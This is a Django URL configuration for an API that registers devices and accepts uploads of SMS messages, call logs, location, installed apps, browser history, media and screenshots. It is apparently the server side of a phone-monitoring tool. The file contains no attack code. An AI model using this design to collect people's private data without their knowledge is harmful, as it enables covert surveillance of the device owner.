"""
API URLs
@author Michael KOJDL
@version 1.0.0
"""
from django.urls import path
from . import views

app_name = 'api'

urlpatterns = [
    # Health check (no authentication required)
    path('health/', views.health_check, name='health_check'),

    # Device Registration
    path('register/', views.register_device, name='register'),

    # Data Upload Endpoints
    path('sms/', views.upload_sms, name='upload_sms'),
    path('calls/', views.upload_calls, name='upload_calls'),
    path('location/', views.upload_location, name='upload_location'),
    path('apps/', views.upload_apps, name='upload_apps'),
    path('browser-history/', views.upload_browser_history, name='upload_browser_history'),
    path('media/', views.upload_media, name='upload_media'),
    path('screenshots/', views.upload_screenshots, name='upload_screenshots'),

    # Device Status
    path('status/', views.device_status, name='device_status'),
]
